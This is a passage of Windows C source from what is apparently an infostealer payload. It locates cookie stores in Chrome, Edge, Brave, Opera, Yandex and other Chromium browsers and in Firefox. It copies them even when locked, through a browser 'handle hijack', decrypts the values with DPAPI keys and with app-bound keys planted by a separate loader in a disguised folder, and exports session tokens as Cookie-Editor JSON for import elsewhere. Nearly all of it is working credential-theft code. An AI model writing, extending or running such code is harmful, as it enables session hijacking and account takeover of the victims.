                   const wchar_t* exe_name, const wchar_t* table_name){
    wchar_t tmp[MAX_PATH]; GetTempPathW(MAX_PATH, tmp);
    lstrcpyW(dst, tmp); lstrcatW(dst, L"ck_db.tmp");
    DeleteFileW(dst);
    DbgH("CopyDb: calling CopyFileShared");
    if(!CopyFileShared(src, dst)){
        // Browser holds 0-sharing lock â€” try handle hijack
        DbgH("CopyDb: CopyFileShared failed, trying handle hijack");
        if(exe_name && *exe_name && HijackCookieDB(exe_name, dst, table_name)){
            DbgH("CopyDb: handle hijack OK");
            return true;
        }
        return false;
    }
    DbgH("CopyDb: main copy OK, doing wal/shm");
    wchar_t s2[MAX_PATH], d2[MAX_PATH];
    lstrcpyW(s2, src); lstrcatW(s2, L"-wal"); lstrcpyW(d2, dst); lstrcatW(d2, L"-wal");
    DeleteFileW(d2); CopyFileShared(s2, d2);
    lstrcpyW(s2, src); lstrcatW(s2, L"-shm"); lstrcpyW(d2, dst); lstrcatW(d2, L"-shm");
    DeleteFileW(d2); CopyFileShared(s2, d2);
    DbgH("CopyDb: done");
    return true;
}

// ------------------------------------------------------------------ browser profiles
struct Br { const wchar_t* name; const wchar_t* rel; const wchar_t* exe; };
static Br g_br[] = { {L"chrome",  L"\\Google\\Chrome\\User Data",           L"chrome.exe"},
                     {L"edge",    L"\\Microsoft\\Edge\\User Data",          L"msedge.exe"},
                     {L"brave",   L"\\BraveSoftware\\Brave-Browser\\User Data", L"brave.exe"},
                     {L"vivaldi", L"\\Vivaldi\\User Data",                  L"vivaldi.exe"},
                     {L"opera",   L"\\Opera Software\\Opera Stable",       L"opera.exe"},
                     {L"chromium",L"\\Chromium\\User Data",                L"chromium.exe"},
                     {L"thorium", L"\\Thorium\\User Data",                 L"thorium.exe"},
                     {L"coccoc",  L"\\CocCoc\\Browser\\User Data",         L"coccoc.exe"},
                     {L"yandex", L"\\Yandex\\YandexBrowser\\User Data",    L"browser.exe"} };

static unsigned char g_key10[32]; static bool g_has10;   // v10/v11 key (DPAPI user)
static unsigned char g_key20[32]; static bool g_has20;   // v20 key (app-bound, pre-extracted)
static bool g_need20;                                    // Local State declares app-bound

// Parse Local State JSON to extract os_crypt.encrypted_key (v10) and app_bound_encrypted_key (v20).
// The v20 app-bound key cannot be unwrapped in-process; the loader's key stage
// (or cookielog.py / ckkey.exe) writes it per browser to
// C:\ProgramData\MediaCache\mc-<browser>.key as a raw 32-byte key or base64.
static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
    Dbg("LoadLocalState: entry");
    g_has10 = g_has20 = g_need20 = false;
    wchar_t ls[1024]; lstrcpyW(ls,root); lstrcatW(ls,L"\\Local State");
    HANDLE h = CreateFileW(ls,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(h==INVALID_HANDLE_VALUE){ Dbg("LoadLocalState: no Local State, return"); return; }
    Dbg("LoadLocalState: reading file");
    // size-based read: Local State regularly exceeds 256 KB on heavy profiles
    // (extensions, histograms) and the old fixed 256 KB buffer cut os_crypt off
    LARGE_INTEGER fsz; GetFileSizeEx(h,&fsz);
    if(fsz.QuadPart <= 0 || fsz.QuadPart > 8*1024*1024){ CloseHandle(h); Dbg("LoadLocalState: bad size"); return; }
    DWORD bufsz = (DWORD)fsz.QuadPart;
    char* buf = (char*)VirtualAlloc(NULL, bufsz+1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if(!buf){ CloseHandle(h); Dbg("LoadLocalState: OOM"); return; }
    DWORD rd=0; ReadFile(h,buf,bufsz,&rd,NULL);
    Dbg("LoadLocalState: ReadFile done");
    CloseHandle(h);
    Dbg("LoadLocalState: CloseHandle done");
    buf[rd]=0;
    Dbg("LoadLocalState: buf null-terminated");
    char* oc = (char*)xstrstr(buf,"\"os_crypt\"");
    if(!oc){ VirtualFree(buf,0,MEM_RELEASE); Dbg("LoadLocalState: no os_crypt"); return; }
    Dbg("LoadLocalState: found os_crypt");
    char* e10 = (char*)xstrstr(oc,"\"encrypted_key\"");
    char* e20 = (char*)xstrstr(oc,"\"app_bound_encrypted_key\"");
    if(e20) g_need20 = true;
    Dbg("LoadLocalState: searched keys");
    struct { const char* tag; unsigned char* key; bool* ok; } want[2] =
        { {0,g_key10,&g_has10}, {0,g_key20,&g_has20} };
    const char* src[2] = { e10, e20 };
    for(int w=0; w<2; w++){
        if(!src[w]) continue;
        Dbg("LoadLocalState: processing key");
        if(w==1){                                                    // v20: per-browser pre-extracted key
            // app_bound_encrypted_key is thousands of base64 chars and is never
            // decoded in-process: it only proves the build uses v20. The key was
            // unwrapped out-of-process and dropped next to the cache.
            wchar_t kp[1024];
            lstrcpyW(kp, L"C:\\ProgramData\\MediaCache\\mc-");
            lstrcatW(kp, brname ? brname : L"x");
            lstrcatW(kp, L".key");
            HANDLE k = CreateFileW(kp, GENERIC_READ, FILE_SHARE_READ, NULL,
                                   OPEN_EXISTING, 0, NULL);
            if(k == INVALID_HANDLE_VALUE)                            // legacy single key
                k = CreateFileW(L"C:\\ProgramData\\MediaCache\\mc.key", GENERIC_READ,
                                FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            if(k == INVALID_HANDLE_VALUE){ Dbg("LoadLocalState: no v20 key file"); continue; }
            char b[96]; memset(b, 0, sizeof(b)); DWORD r2 = 0;
            ReadFile(k, b, sizeof(b)-1, &r2, NULL); CloseHandle(k);
            if(r2 == 32){                                            // raw key
                memcpy(g_key20, b, 32); g_has20 = true;
            } else if(r2 > 32){                                      // base64 key
                DWORD kl = 32;
                if(CryptStringToBinaryA(b, 0, CRYPT_STRING_BASE64, g_key20, &kl, NULL, NULL))
                    g_has20 = (kl == 32);
            }
            DbgInt("LoadLocalState: v20 key loaded", g_has20 ? 1 : 0);
            continue;
        }
        const char* q1 = xstrchr(src[w],'"');
        Dbg("LoadLocalState: q1 done");
        if(!q1) continue;
        const char* c  = xstrchr(q1,':');
        Dbg("LoadLocalState: colon done");
        if(!c) continue;
        const char* q2 = xstrchr(c,'"');
        Dbg("LoadLocalState: q2 done");
        if(!q2) continue;
        const char* q3 = xstrchr(q2+1,'"');
        Dbg("LoadLocalState: q3 done");
        if(!q3) continue;
        int n = (int)(q3 - q2 - 1);
        Dbg("LoadLocalState: n computed");
        if(n <= 5 || n > 512) { Dbg("LoadLocalState: n out of range, skip"); continue; }
        Dbg("LoadLocalState: before b64 copy");
        char b64[600];
        for(int i = 0; i < n; i++) b64[i] = q2[1 + i];
        b64[n] = 0;
        Dbg("LoadLocalState: b64 copied, calling CryptStringToBinaryA");
        static unsigned char raw[512]; DWORD rl = (DWORD)sizeof(raw);
        if(!CryptStringToBinaryA(b64,0,CRYPT_STRING_BASE64,NULL,&rl,NULL,NULL) || rl>sizeof(raw)) continue;
        CryptStringToBinaryA(b64,0,CRYPT_STRING_BASE64,raw,&rl,NULL,NULL);
        Dbg("LoadLocalState: b64 decoded OK");
        if(w==0){                                                    // v10/v11: user DPAPI
            DbgInt("LoadLocalState: v10 raw len", rl);
            DbgInt("LoadLocalState: v10 raw[0]", raw[0]);
            if(raw[0]=='D'&&raw[1]=='P'&&raw[2]=='A'&&raw[3]=='P'&&raw[4]=='I'){
                // DPAPI prefix (5 bytes) + encrypted key blob
                DWORD outlen = sizeof(g_key10);
                g_has10 = Dpapi(raw+5, rl-5, g_key10, &outlen, false) && outlen>=16;
                DbgInt("LoadLocalState: Dpapi result", g_has10?1:0);
                DbgInt("LoadLocalState: Dpapi outlen", outlen);
                if(g_has10) DbgInt("LoadLocalState: key10[0]", g_key10[0]);
            } else {
                Dbg("LoadLocalState: raw does not start with DPAPI, trying direct");
                // Some versions store the key without DPAPI wrapping
                if(rl>=32){ memcpy(g_key10,raw,32); g_has10=true; Dbg("LoadLocalState: v10 direct key OK"); }
                else { Dbg("LoadLocalState: v10 key too short, no DPAPI prefix"); }
            }
        }
    }
    VirtualFree(buf,0,MEM_RELEASE);
    Dbg("LoadLocalState: done");
}

// SHA-256 via CNG (BCrypt) - used to verify cookie domain hash prefix
static void Sha256Hash(const unsigned char* data,unsigned int len,unsigned char*out32); // defined below
static bool Sha256(const unsigned char* data, ULONG len, unsigned char* out32){
    Sha256Hash(data, len, out32);
    return true;
}

// Manual SHA-256 implementation (FIPS 180-4) - no CRT dependency needed
// Used to verify the 32-byte domain hash prefix in Chrome >=118 cookies.
typedef struct { unsigned int h[8]; unsigned long long len; unsigned char buf[64]; int buflen; } Sha256Ctx;
static const unsigned int SHA256_K[64]={
0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2};
#define SHA256_ROTR(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define SHA256_CH(x,y,z) (((x)&(y))^(~(x)&(z)))
#define SHA256_MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define SHA256_S0(x) (SHA256_ROTR(x,2)^SHA256_ROTR(x,13)^SHA256_ROTR(x,22))
#define SHA256_S1(x) (SHA256_ROTR(x,6)^SHA256_ROTR(x,11)^SHA256_ROTR(x,25))
#define SHA256_s0(x) (SHA256_ROTR(x,7)^SHA256_ROTR(x,18)^((x)>>3))
#define SHA256_s1(x) (SHA256_ROTR(x,17)^SHA256_ROTR(x,19)^((x)>>10))
static void Sha256Init(Sha256Ctx*c){c->len=0;c->buflen=0;
c->h[0]=0x6a09e667;c->h[1]=0xbb67ae85;c->h[2]=0x3c6ef372;c->h[3]=0xa54ff53a;
c->h[4]=0x510e527f;c->h[5]=0x9b05688c;c->h[6]=0x1f83d9ab;c->h[7]=0x5be0cd19;}
static void Sha256Block(Sha256Ctx*c,const unsigned char*p){
    unsigned int w[64]; int i;
    for(i=0;i<16;i++){w[i]=((unsigned int)p[i*4]<<24)|((unsigned int)p[i*4+1]<<16)|((unsigned int)p[i*4+2]<<8)|p[i*4+3];}
    for(i=16;i<64;i++)w[i]=SHA256_s1(w[i-2])+w[i-7]+SHA256_s0(w[i-15])+w[i-16];
    unsigned int a=c->h[0],b=c->h[1],cc=c->h[2],d=c->h[3],e=c->h[4],f=c->h[5],g=c->h[6],h=c->h[7],t1,t2;
    for(i=0;i<64;i++){t1=h+SHA256_S1(e)+SHA256_CH(e,f,g)+SHA256_K[i]+w[i];t2=SHA256_S0(a)+SHA256_MAJ(a,b,cc);
    h=g;g=f;f=e;e=d+t1;d=cc;cc=b;b=a;a=t1+t2;}
    c->h[0]+=a;c->h[1]+=b;c->h[2]+=cc;c->h[3]+=d;c->h[4]+=e;c->h[5]+=f;c->h[6]+=g;c->h[7]+=h;}
static void Sha256Update(Sha256Ctx*c,const unsigned char*data,unsigned int len){
    c->len+=len;
    if(c->buflen){int need=64-c->buflen;if(len<need){memcpy(c->buf+c->buflen,data,len);c->buflen+=len;return;}
    memcpy(c->buf+c->buflen,data,need);Sha256Block(c,c->buf);data+=need;len-=need;}
    while(len>=64){Sha256Block(c,data);data+=64;len-=64;}
    if(len){memcpy(c->buf,data,len);c->buflen=len;}}
static void Sha256Final(Sha256Ctx*c,unsigned char*out32){
    unsigned long long bits=c->len*8;
    c->buf[c->buflen++]=0x80;
    if(c->buflen>56){memset(c->buf+c->buflen,0,64-c->buflen);Sha256Block(c,c->buf);c->buflen=0;}
    memset(c->buf+c->buflen,0,56-c->buflen);
    for(int i=0;i<8;i++)c->buf[56+i]=(unsigned char)(bits>>((7-i)*8));
    Sha256Block(c,c->buf);
    for(int i=0;i<8;i++){out32[i*4]=(unsigned char)(c->h[i]>>24);out32[i*4+1]=(unsigned char)(c->h[i]>>16);
    out32[i*4+2]=(unsigned char)(c->h[i]>>8);out32[i*4+3]=(unsigned char)c->h[i];}}
static void Sha256Hash(const unsigned char*data,unsigned int len,unsigned char*out32){
    Sha256Ctx c;Sha256Init(&c);Sha256Update(&c,data,len);Sha256Final(&c,out32);}

// Decrypt a single Chromium cookie value
// Format: "v10" or "v20" prefix (3 bytes) + 12-byte nonce + ciphertext + 16-byte GCM tag
// Chrome >=118 (including v10) prepends a 32-byte SHA256(host_key) domain hash
// to the plaintext for cookie isolation. We verify it with SHA256 and strip it.
// host_key is the cookie's domain (e.g. ".youtube.com") used for hash verification.
static bool DecCookie(const unsigned char* enc, int n, unsigned char* out, int* on,
                      const char* host_key){
    if(n<31){ return false; }
    const unsigned char* k = g_key10;
    bool isv20 = (enc[0]=='v'&&enc[1]=='2'&&enc[2]=='0');
    if(isv20){ if(!g_has20){ Dbg("DecCookie: no v20 key"); return false; } k=g_key20; }
    else if(enc[0]=='v'&&(enc[1]=='0'||enc[1]=='1')){ if(!g_has10){ Dbg("DecCookie: no v10 key"); return false; } k=g_key10; }
    else{ Dbg("DecCookie: unknown version prefix"); return false; }
    ULONG got=0;
    ULONG ctLen = n-15-16;
    bool ok = AesGcm(k,32,enc+3,enc+15,ctLen,enc+n-16,out,ctLen,&got);
    if(!ok){ DbgInt("DecCookie: AesGcm failed, n=", n); return false; }
    // Chrome >=118: both v10 and v20 may have 32-byte SHA256(host_key) prefix.
    // Verify by computing SHA256(host_key) and comparing to first 32 bytes.
    int s = 0;
    if(got >= 32 && host_key){
        unsigned char h[32];
        Sha256Hash((const unsigned char*)host_key, (unsigned int)lstrlenA(host_key), h);
        if(memcmp(out, h, 32) == 0) s = 32;  // hash matches - strip it
    }
    *on = (int)(got - s); memmove(out, out+s, *on); return true;
}

// Extract cookies from a Chromium-based browser in Cookie-Editor JSON format
// One Cookies database: copy (with WAL), read, decrypt, emit records, add a
// coverage row. profile is the directory name, or "." for a root-level store.
static void DumpChromiumDb(const wchar_t* brname, const wchar_t* profile,
                           const wchar_t* db, const wchar_t* exe, const char* kind){
    wchar_t tmp_db[MAX_PATH];
    if(!CopyDb(db,tmp_db,MAX_PATH,exe,L"cookies")){
        Dbg("DumpChromiumDb: copy failed (browser running?)");
        SrcAdd(kind, brname, profile, db, 0, 0, 0, "locked");
        return;
    }
    char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
    DbgStr("DumpChromiumDb: opening ", path8);
    void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
    if(rc||!con){ SrcAdd(kind, brname, profile, db, 0, 0, 0, "locked"); return; }
    void* st=NULL;
    const wchar_t* SQL = L"SELECT host_key,name,path,encrypted_value,expires_utc,"
                         L"is_secure,is_httponly,samesite FROM cookies;";
    int prc=S_prep(con,SQL,-1,&st,NULL);
    if(prc){ S_close(con); SrcAdd(kind, brname, profile, db, 0, 0, 0, "unsupported"); return; }
    int rows=0, dec=0, failed=0;
    while(S_step(st)==100){                                    // SQLITE_ROW
        rows++;
        RecStart();
        FieldS0("domain",st,0); FieldS("name",st,1); FieldS("path",st,2);
        { char b8[64]; int bl = ToUtf8(brname, b8, sizeof(b8));
          PutS(",\"browser\":"); PutJ(b8, bl);
          char p8[160]; int pl = ToUtf8(profile, p8, sizeof(p8));
          PutS(",\"profile\":"); PutJ(p8, pl); }
        const unsigned char* enc=(const unsigned char*)S_blob(st,3); int en=S_bytes(st,3);
        const char* host_key=(const char*)S_blob(st,0);  // host_key for SHA256 domain hash verification
        // Cookie blobs can exceed any fixed buffer (SSO/JWT session tokens reach
        // 4-8KB+): a fixed pt[4096] overflowed the stack on the first oversized
        // cookie and killed the payload silently. Heap buffer sized by the blob.
        unsigned char* pt = (en > 0 && en <= 4194304)
            ? (unsigned char*)VirtualAlloc(NULL, en, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
        int pn=0;
        if(pt && enc && DecCookie(enc,en,pt,&pn,host_key)){
            PutS(",\"value\":"); PutJ((char*)pt,pn); dec++;
        }
        else { PutS(",\"value\":\"\""); failed++; }
        if(pt) VirtualFree(pt, 0, MEM_RELEASE);
        // expires_utc: 64-bit microseconds since 1601 -> Unix epoch
        long long eu = S_int64(st,4);
        long long unix = eu ? eu / 1000000 - 11644473600LL : 0;
        PutS(",\"expirationDate\":"); PutN(unix);
        int ss = S_int(st,7);
        // Chromium CookieSameSite: 0=no_restriction(None), 1=Lax, 2=Strict,
        // -1=unspecified (treated as Lax by every browser). The old mapping
        // swapped 1 and 2 and turned every Lax cookie into Strict on import.
        FieldStr("sameSite", ss==0 ? "None" : (ss==2 ? "Strict" : "Lax"));
        FieldB("secure",S_int(st,5));
        FieldB("httpOnly",S_int(st,6));
        // hostOnly: true if domain does not start with "."
        { const char* d=(const char*)S_blob(st,0); FieldB("hostOnly", d && d[0]!='.'); }
        FieldB("session", unix==0);
        PutS("}");
    }
    // A source that found an app-bound Local State but no key is the difference
    // between "this profile is empty" and "we left every v20 cookie behind".
    const char* skip = "";
    if(g_need20 && !g_has20) skip = "no-key";
    else if(rows > 0 && dec == 0 && failed > 0 && !g_has10) skip = "v10-fail";
    SrcAdd(kind, brname, profile, db, rows, dec, failed, skip);
    DbgInt("DumpChromiumDb: rows extracted", rows);
    S_fin(st); S_close(con);
}

// Chromium family: root-level Cookies first (Opera Stable, Electron/CEF keep
// the store at the userData root), then every profile directory.
static void DumpChromium(const wchar_t* brname, const wchar_t* root,
                         const wchar_t* exe, const char* kind){
    const wchar_t* sfx[2] = {L"\\Network\\Cookies", L"\\Cookies"};
    for(int si=0; si<2; si++){
        wchar_t db[1024]; lstrcpyW(db,root); lstrcatW(db,sfx[si]);
        if(GetFileAttributesW(db)!=INVALID_FILE_ATTRIBUTES)
            DumpChromiumDb(brname, L".", db, exe, kind);
    }
    // FindFirstFile only accepts wildcards in the LAST path component; enumerate profiles first
    wchar_t pat[1024]; lstrcpyW(pat,root); lstrcatW(pat,L"\\*");
    WIN32_FIND_DATAW fd; HANDLE f = FindFirstFileW(pat,&fd);
    if(f==INVALID_HANDLE_VALUE) return;
    do{
        if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if(fd.cFileName[0]==L'.') continue;
        for(int si=0; si<2; si++){
            wchar_t db[1024]; lstrcpyW(db,root); lstrcatW(db,L"\\");
            lstrcatW(db,fd.cFileName); lstrcatW(db,sfx[si]);
            if(GetFileAttributesW(db)==INVALID_FILE_ATTRIBUTES) continue;
            DumpChromiumDb(brname, fd.cFileName, db, exe, kind);
        }
    } while(FindNextFileW(f,&fd));
    FindClose(f);
}

// Extract cookies from Firefox in Cookie-Editor JSON format
// ------------------------------------------------------------------ Firefox sessionstore
// sessionstore.jsonlz4 / sessionstore-backups\recovery.jsonlz4 hold the live
// session cookies as mozLz4: "mozLz40\0" + u32 uncompressed size + LZ4 block.
// Cookies.sqlite has the persisted jar; the recovery file has what the current
// session wrote after the last flush. Both are plaintext.
static int Lz4Block(const unsigned char* src, int slen, unsigned char* dst, int dcap){
    int si=0, di=0;
    while(si < slen){
        unsigned token = src[si++];
        int lit = (int)(token >> 4);
        if(lit == 15){
            int b;
            do{ if(si>=slen) return -1; b=src[si++]; lit+=b; }while(b==255);
        }
        if(si+lit>slen || di+lit>dcap) return -1;
        memcpy(dst+di, src+si, (size_t)lit); si+=lit; di+=lit;
        if(si >= slen) break;                       // last sequence: literals only
        if(si+2 > slen) return -1;
        int off = (int)src[si] | ((int)src[si+1]<<8); si+=2;
        if(off==0 || off>di) return -1;
        int ml = (int)(token & 15);
        if(ml == 15){
            int b;
            do{ if(si>=slen) return -1; b=src[si++]; ml+=b; }while(b==255);
        }
        ml += 4;
        if(di+ml>dcap) return -1;
        for(int i=0;i<ml;i++){ dst[di]=dst[di-off]; di++; }
    }
    return di;
}

static int ReadWholeFile(const wchar_t* path, unsigned char** out, unsigned int cap){
    *out = NULL;
    HANDLE h = CreateFileW(path, GENERIC_READ,
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(h == INVALID_HANDLE_VALUE) return -1;
    LARGE_INTEGER sz;
    if(!GetFileSizeEx(h,&sz) || sz.QuadPart<=0 || sz.QuadPart>(long long)cap){ CloseHandle(h); return -1; }
    unsigned char* buf = (unsigned char*)VirtualAlloc(NULL,(SIZE_T)sz.QuadPart,
                                                      MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!buf){ CloseHandle(h); return -1; }
    DWORD got=0, total=0;
    while(total < (DWORD)sz.QuadPart){
        if(!ReadFile(h,buf+total,(DWORD)sz.QuadPart-total,&got,NULL) || !got) break;
        total += got;
    }
    CloseHandle(h);
    if(total != (DWORD)sz.QuadPart){ VirtualFree(buf,0,MEM_RELEASE); return -1; }
    *out = buf;
    return (int)total;
}

// Minimal JSON reader for the cookie objects. The payload already carries a
// writer; this is the matching read side, not a general parser.
static int JUnescape(const char* p, const char* end, char* out, int cap){
    int n=0;
    while(p<end && *p!='"'){
        unsigned char c=(unsigned char)*p++;
        if(c=='\\' && p<end){
            c=(unsigned char)*p++;
            if(c=='n') c='\n'; else if(c=='r') c='\r'; else if(c=='t') c='\t';
            else if(c=='b') c=8; else if(c=='f') c=12;
            else if(c=='u'){
                unsigned v=0; int k=0;
                while(k<4 && p<end){
                    char h=*p++; v<<=4;
                    if(h>='0'&&h<='9') v|=h-'0';
                    else if(h>='a'&&h<='f') v|=h-'a'+10;
                    else if(h>='A'&&h<='F') v|=h-'A'+10;
                    k++;
                }
                if(v>=0xD800 && v<=0xDBFF && p+6<=end && p[0]=='\\' && p[1]=='u'){
                    p+=2; unsigned lo=0; int k2=0;
                    while(k2<4 && p<end){
                        char h=*p++; lo<<=4;
                        if(h>='0'&&h<='9') lo|=h-'0';
                        else if(h>='a'&&h<='f') lo|=h-'a'+10;
                        else if(h>='A'&&h<='F') lo|=h-'A'+10;
                        k2++;
                    }
                    if(lo>=0xDC00 && lo<=0xDFFF) v=0x10000+((v-0xD800)<<10)+(lo-0xDC00);
                }
                if(v<0x80){ if(n<cap) out[n++]=(char)v; }
                else if(v<0x800){ if(n+1<cap){ out[n++]=(char)(0xC0|(v>>6)); out[n++]=(char)(0x80|(v&0x3F)); } }
                else if(v<0x10000){ if(n+2<cap){ out[n++]=(char)(0xE0|(v>>12)); out[n++]=(char)(0x80|((v>>6)&0x3F)); out[n++]=(char)(0x80|(v&0x3F)); } }
                else { if(n+3<cap){ out[n++]=(char)(0xF0|(v>>18)); out[n++]=(char)(0x80|((v>>12)&0x3F)); out[n++]=(char)(0x80|((v>>6)&0x3F)); out[n++]=(char)(0x80|(v&0x3F)); } }
                continue;
            }
        }
        if(n<cap) out[n++]=(char)c;
    }
    return n;
}

static const char* JKey(const char* p, const char* end, const char* key, int klen){
    for(; p+1+klen < end; p++){
        if(*p!='"') continue;
        if(memcmp(p+1,key,(size_t)klen)==0 && p[1+klen]=='"'){
            const char* q=p+2+klen;
            while(q<end && (*q==' '||*q=='\t'||*q=='\n'||*q=='\r')) q++;
            if(q<end && *q==':'){ q++; while(q<end && (*q==' '||*q=='\t'||*q=='\n'||*q=='\r')) q++; return q; }
        }
    }
    return NULL;
}

static int JStr(const char* obj, const char* end, const char* key, char* out, int cap){
    out[0]=0;
    const char* v = JKey(obj,end,key,lstrlenA(key));
    if(!v || v>=end || *v!='"') return -1;
    return JUnescape(v+1,end,out,cap);
}

static long long JNum(const char* obj, const char* end, const char* key, long long def){
    const char* v = JKey(obj,end,key,lstrlenA(key));
    if(!v || v>=end) return def;
    long long sign=1;
    if(*v=='-'){ sign=-1; v++; }
    if(v>=end || *v<'0' || *v>'9') return def;
    long long n=0;
    while(v<end && *v>='0' && *v<='9'){ n=n*10+(*v-'0'); v++; }
    return n*sign;
}

static int JBool(const char* obj, const char* end, const char* key, int def){
    const char* v = JKey(obj,end,key,lstrlenA(key));
    if(!v || v>=end) return def;
    if(v+4<=end && memcmp(v,"true",4)==0) return 1;
    if(v+5<=end && memcmp(v,"false",5)==0) return 0;
    return def;
}

static const char* JObjEnd(const char* p, const char* end){
    int depth=0; bool instr=false;
    for(; p<end; p++){
        char c=*p;
        if(instr){
            if(c=='\\'){ p++; continue; }
            if(c=='"') instr=false;
            continue;
        }
        if(c=='"') instr=true;
        else if(c=='{') depth++;
        else if(c=='}'){ depth--; if(depth==0) return p+1; }
    }
    return NULL;
}

static void DumpFirefoxSessionFile(const wchar_t* profile, const wchar_t* file){
    unsigned char* raw=NULL;
    int n = ReadWholeFile(file,&raw,64u<<20);
    if(n<12 || memcmp(raw,"mozLz40\0",8)!=0){
        if(raw) VirtualFree(raw,0,MEM_RELEASE);
        SrcAdd("firefox",L"firefox",profile,file,0,0,0,"unsupported");
        return;
    }
    unsigned int want = (unsigned)raw[8] | ((unsigned)raw[9]<<8) |
                        ((unsigned)raw[10]<<16) | ((unsigned)raw[11]<<24);
    if(want==0 || want>(256u<<20)){
        VirtualFree(raw,0,MEM_RELEASE);
        SrcAdd("firefox",L"firefox",profile,file,0,0,0,"unsupported");
        return;
    }
    unsigned char* js = (unsigned char*)VirtualAlloc(NULL,want,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    int got = js ? Lz4Block(raw+12,n-12,js,(int)want) : -1;
    VirtualFree(raw,0,MEM_RELEASE);
    if(got<=0){
        if(js) VirtualFree(js,0,MEM_RELEASE);
        SrcAdd("firefox",L"firefox",profile,file,0,0,0,"unsupported");
        return;
    }
    const char* p=(const char*)js;
    const char* end=p+got;
    const char* arr=NULL;
    for(const char* q=p; q+9<end; q++){
        if(q[0]=='"' && memcmp(q+1,"cookies",7)==0 && q[8]=='"'){
            const char* r=q+9;
            while(r<end && *r!='[' && *r!='}') r++;
            if(r<end && *r=='['){ arr=r+1; break; }
        }
    }
    int rows=0, dec=0;
    if(arr){
        const char* q=arr;
        while(q<end){
            while(q<end && *q!=',' && *q!=']' && *q!='{') q++;
            if(q>=end || *q==']') break;
            if(*q!='{'){ q++; continue; }
            const char* oe=JObjEnd(q,end);
            if(!oe) break;
            rows++;
            char cname[256], cval[8192], chost[512], cpath[1024];
            int nl=JStr(q,oe,"name",cname,sizeof(cname));
            int vl=JStr(q,oe,"value",cval,sizeof(cval));
            int hl=JStr(q,oe,"host",chost,sizeof(chost));
            int pl=JStr(q,oe,"path",cpath,sizeof(cpath));
            if(nl>0 && vl>=0 && hl>0 && pl>=0){
                long long exp=JNum(q,oe,"expiry",0);
                int secure=JBool(q,oe,"isSecure",0);
                int http=JBool(q,oe,"isHttpOnly",0);
                int ss=(int)JNum(q,oe,"sameSite",0);
                RecStart();
                PutS("\"name\":"); PutJ(cname,nl);
                PutS(",\"value\":"); PutJ(cval,vl);
                PutS(",\"domain\":"); PutJ(chost,hl);
                PutS(",\"path\":"); PutJ(cpath,pl);
                { char p8[160]; int pn=ToUtf8(profile,p8,sizeof(p8));
                  PutS(",\"browser\":\"firefox\",\"profile\":"); PutJ(p8,pn); }
                PutS(",\"expirationDate\":"); PutN(exp);
                FieldStr("sameSite", ss==2 ? "Strict" : (ss==1 ? "Lax" : "None"));
                FieldB("secure",secure); FieldB("httpOnly",http);
                FieldB("hostOnly", chost[0]!='.');
                FieldB("session", exp==0);
                PutS("}");
                dec++;
            }
            q=oe;
        }
    }
    SrcAdd("firefox",L"firefox",profile,file,rows,dec,0,"");
    VirtualFree(js,0,MEM_RELEASE);
}

static void DumpFirefox(const wchar_t* appdata, bool notice){
    wchar_t pdir[1024]; lstrcpyW(pdir,appdata); lstrcatW(pdir,L"\\Mozilla\\Firefox\\Profiles");
    if(GetFileAttributesW(pdir)==INVALID_FILE_ATTRIBUTES){
        Dbg("DumpFirefox: no Profiles dir");
        if(notice) SrcAdd("firefox",L"firefox",L".",pdir,0,0,0,"missing");
        return;
    }
    wchar_t pat[1024]; lstrcpyW(pat,pdir); lstrcatW(pat,L"\\*");
    WIN32_FIND_DATAW fd; HANDLE f = FindFirstFileW(pat,&fd);
    if(f==INVALID_HANDLE_VALUE){ Dbg("DumpFirefox: no profiles found"); return; }
    Dbg("DumpFirefox: found profiles, iterating");
    do{
        if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if(fd.cFileName[0]==L'.') continue;
        wchar_t db[1024]; lstrcpyW(db,pdir); lstrcatW(db,L"\\"); lstrcatW(db,fd.cFileName);
        lstrcatW(db,L"\\cookies.sqlite");
        if(GetFileAttributesW(db)!=INVALID_FILE_ATTRIBUTES){
            wchar_t tmp_db[MAX_PATH];
            if(!CopyDb(db,tmp_db,MAX_PATH,NULL,L"cookies")){
                Dbg("DumpFirefox: copy failed");
                SrcAdd("firefox",L"firefox",fd.cFileName,db,0,0,0,"locked");
            } else {
                Dbg("DumpFirefox: copy OK");
                char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
                DbgStr("DumpFirefox: opening ", path8);
                void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
                if(rc||!con){
